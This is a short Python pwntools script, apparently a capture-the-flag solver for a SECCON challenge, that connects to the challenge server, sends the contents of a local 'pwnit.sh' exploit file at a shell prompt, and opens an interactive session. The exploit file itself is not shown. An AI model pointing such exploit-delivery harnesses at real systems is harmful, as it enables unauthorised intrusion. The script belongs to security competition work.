#!/usr/bin/env python3
from pwn import *


def main():
    with remote("swppci.seccon.games", 5000) as tube:
        with open("pwnit.sh", "rb") as f:
            tube.sendafter(b"~ # ", f.read())
        tube.interactive()


if __name__ == "__main__":
    main()
